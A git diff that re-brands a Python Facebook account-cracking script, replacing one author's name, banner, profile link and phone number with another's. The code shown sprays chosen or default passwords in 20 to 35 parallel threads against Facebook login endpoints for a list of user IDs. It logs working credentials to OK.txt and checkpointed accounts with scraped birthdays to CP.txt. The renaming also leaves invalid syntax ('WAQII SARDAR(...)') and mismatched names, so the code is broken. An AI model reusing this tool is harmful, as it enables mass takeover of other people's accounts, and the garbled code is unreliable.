@@ -61,7 +61,7 @@ def readline___Public_Xml():
 		login()
 	elif key in ["0", "00" , "6"]:
 		time.sleep(0.5)
-		print (" [•] Search : Imtiaz Aking")
+		print (" [•] Search :Waqii Aking")
 	elif key in ["0", "00"]:
 		exit("\n [✓] Thank you so much♥️\n")
 	else:
@@ -73,8 +73,8 @@ id = []
 user = []
 num = 0
 loop = 0
-IMTIAZ = requests.get
-Prof_Imtiaz = open
+WAQII= requests.get
+Prof_waqii = open
 _silet_koceng_  = requests.Session()
 url_mb = "https://mbasic.facebook.com"
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
@@ -119,11 +119,11 @@ def banner():
 	logo()
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		IMTIAZ_AKING('\n\n\033[0m The Prosess Done...')
-		IMTIAZ_AKING('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
-		#IMTIAZ_AKING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
+		WAQII SARDAR('\n\n\033[0m The Prosess Done...')
+		WAQII SARDAR('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
+		#WAQII SARDAR('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
 	else:
-		IMTIAZ_AKING('\n\033[0mUps..Tidak Mendapatkan Hasil')
+		WAQII SARDAR('\n\033[0mUps..Tidak Mendapatkan Hasil')
 		exit()
 class __crack__:
 	def __init__(self):
@@ -132,38 +132,38 @@ class __crack__:
 		try:
 			self.apk = input(" [*] File Name : ")
 			print (' [*]=============================================')
-			self.id = IMTIAZ(self.apk).read().splitlines()
-			IMTIAZ_AKING(' [*] Total ID : %s'%(len(self.id)))
+			self.id = WAQII(self.apk).read().splitlines()
+			WAQII SARDAR(' [*] Total ID : %s'%(len(self.id)))
 			print (' [✓] Are You Went To Continue : Type Y')
 		except:
-			IMTIAZ_AKING('\n [!] File Not Found In Storage')
+			WAQII SARDAR('\n [!] File Not Found In Storage')
 			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
      
 		_jokowi_kontol_ = input(" [*] Choose : ")
 		if _jokowi_kontol_ in ('M', 'm'):
 			print('[*] Function Added in new update ')
 		
-			IMTIAZ_AKING('\nEnter Password 123456 or 123456789 For OLd Idz ')
+			WAQII SARDAR('\nEnter Password 123456 or 123456789 For OLd Idz ')
 			while True:
 				pwek = input('\nEnter Password : ')
-				#IMTIAZ_AKING('Sandi > %s'%(pwek))
+				#WAQII SARDAR('Sandi > %s'%(pwek))
 				if pwek == '':
-					IMTIAZ_AKING('\nJangan Kosong')
+					WAQII SARDAR('\nJangan Kosong')
 					time.sleep(1)
 					exit()
 				elif len(pwek)<=5:
-					IMTIAZ_AKING('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
+					WAQII SARDAR('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
 				else:
 					def _sempak_(bse=None):
 						boy = input('\nPilih : ')
 						if boy == '':
-							IMTIAZ_AKING('\nJangan Kosong')
+							WAQII SARDAR('\nJangan Kosong')
 							time.sleep(1);self._sempak_()
 						elif boy == "1" or boy == "01":
-							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+							WAQII SARDAR('\n[•] Result OK saved to OK.txt')
+							WAQII SARDAR('[•] Result CP saved to CP.txt')
+							WAQII SARDAR('\n\tCrack Processing...\n')
+							WAQII SARDAR('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -174,9 +174,9 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "2" or boy == "02":
-							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+							WAQII SARDAR('\n[•] Result OK saved to OK.txt')
+							WAQII SARDAR('[•] Result CP saved to CP.txt')
+							WAQII SARDAR('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -186,10 +186,10 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "3" or boy == "03":
-							IMTIAZ_AKING('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+							WAQII SARDAR('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
+							WAQII SARDAR('[•] Result CP saved to CP.txt')
+							WAQII SARDAR('\n\tCrack Processing...\n\n')
+							WAQII SARDAR('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -201,18 +201,18 @@ class __crack__:
 							hasil(ok,cp)
 						else:
 							exit()
-					IMTIAZ_AKING('\n01.) Metode b-api ')
-					IMTIAZ_AKING('02.) Metode mbasic ')
-					IMTIAZ_AKING('03.) Metode Mobile ')
+					WAQII SARDAR('\n01.) Metode b-api ')
+					WAQII SARDAR('02.) Metode mbasic ')
+					WAQII SARDAR('03.) Metode Mobile ')
 					_sempak_(pwek.split(','))
 					break
 		elif _jokowi_kontol_ in ('Y', 'y'):
 			print (' [*]=============================================')
-			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
+			WAQII SARDAR('\n\t------[ Method Crack ]-----')
 			print (' [*]=============================================')
-			IMTIAZ_AKING(' [1] AKING Method 1 ')
-			IMTIAZ_AKING(' [2] AKING Method 2  [ Pro ]')
-			IMTIAZ_AKING(' [3] AKING Method 3   ')
+			WAQII SARDAR(' [1] AKING Method 1 ')
+			WAQII SARDAR(' [2] AKING Method 2  [ Pro ]')
+			WAQII SARDAR(' [3] AKING Method 3   ')
 			print (' [*]=============================================')
 			self.__pler__()
 		else:
@@ -227,12 +227,12 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = WAQII('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
+			p = Prof_waqii("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
-				IMTIAZ_AKING('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
+				WAQII SARDAR('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s %s'%(user,pw,tahun(user))
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -240,11 +240,11 @@ class __crack__:
 				continue
 			elif "www.facebook.com" in p["error_msg"]:
 				try:
-					token = IMTIAZ('login.txt').read()
-					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
+					token = WAQII('login.txt').read()
+					cp_ttl = Prof_waqii('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
+					WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -255,7 +255,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
+				WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s%s' % (user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -271,7 +271,7 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = WAQII('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			ses = requests.Session()
@@ -281,7 +281,7 @@ class __crack__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				IMTIAZ_AKING('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
+				WAQII SARDAR('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -289,10 +289,10 @@ class __crack__:
 				continue
 			elif 'checkpoint' in ses.cookies.get_dict():
 				try:
-					token = IMTIAZ('token.txt').read()
-					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
+					token = WAQII('token.txt').read()
+					cp_ttl = Prof_Waqii('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					month = bulan_ttl[month].WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -303,7 +303,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (user,pw,tahun(user)))
+				WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -319,7 +319,7 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = WAQII('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			ses = requests.Session()
@@ -329,7 +329,7 @@ class __crack__:
 			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				IMTIAZ_AKING('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
+				WAQII SARDAR('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
 				wrt = '%s - %s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -337,11 +337,11 @@ class __crack__:
 				continue
 			elif 'checkpoint' in ses.cookies.get_dict():
 				try:
-					token = IMTIAZ('token.txt').read()
+					token = WAQII('token.txt').read()
 					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -352,7 +352,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (user,pw,tahun(user)))
+				WAQII SARDAR('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -362,13 +362,13 @@ class __crack__:
 	def __pler__(self):
 		yan = input('\n[•] Choose : ')
 		if yan == '':
-			IMTIAZ_AKING('\Choose Error ')
+			WAQII SARDAR('\Choose Error ')
 			exit()
 		elif yan in ('1', '01'):
-			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-			IMTIAZ_AKING('\n\tCrack Processing...\n')
-			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+			WAQII SARDAR('\n[•] Result OK saved to OK.txt')
+			WAQII SARDAR('[•] Result CP saved to CP.txt')
+			WAQII SARDAR('\n\tCrack Processing...\n')
+			WAQII SARDAR('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -390,10 +390,10 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		elif yan in ('2', '02'):
-			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-			IMTIAZ_AKING('\n\tCrack Processing...\n')
-			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
+			WAQII SARDAR('\n[•] Result OK saved to OK.txt')
+			WAQII SARDAR('[•] Result CP saved to CP.txt')
+			WAQII SARDAR('\n\tCrack Processing...\n')
+			WAQII SARDAR('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -438,7 +438,7 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		else:
-			IMTIAZ_AKING('\nSalah')
+			WAQII SARDAR('\nSalah')
 			time.sleep(1)
 			self.__pler__()
 def tahun(fx):
@@ -483,18 +483,20 @@ imtiazak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.
 imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
 imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 banner="""\033[1;37m
-       ###       ##    ## #### ##    ##  ######
-      ## ##      ##   ##   ##  ###   ## ##    ##
-     ##   ##     ##  ##    ##  ####  ## ##
-    ##     ##    #####     ##  ## ## ## ##   ####
-    #########    ##  ##    ##  ##  #### ##    ##
-    ##     ##    ##   ##   ##  ##   ### ##    ##
-    ##     ##    ##    ## #### ##    ##  ######
+       
+██╗    ██╗ █████╗  ██████╗ ██╗██╗
+██║    ██║██╔══██╗██╔═══██╗██║██║
+██║ █╗ ██║███████║██║   ██║██║██║
+██║███╗██║██╔══██║██║▄▄ ██║██║██║
+╚███╔███╔╝██║  ██║╚██████╔╝██║██║
+ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝╚═╝
+                                 
+
  [*]=============================================
-    Author   : IMTIAZ AKING
-    Facebook : https://facebook.com/Imtiaz.Aking
-    Team     : Somi + Zahid
-    Connect  : 03237528063
+    Author   : WAQII SARDAR 
+    Facebook : https://www.facebook.com/SaRdaRWaQiiKhaN
+    Team     : WaQii + SarDar
+    Connect  : 03445042688
  [*]=============================================
    \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
  [*]============================================="""
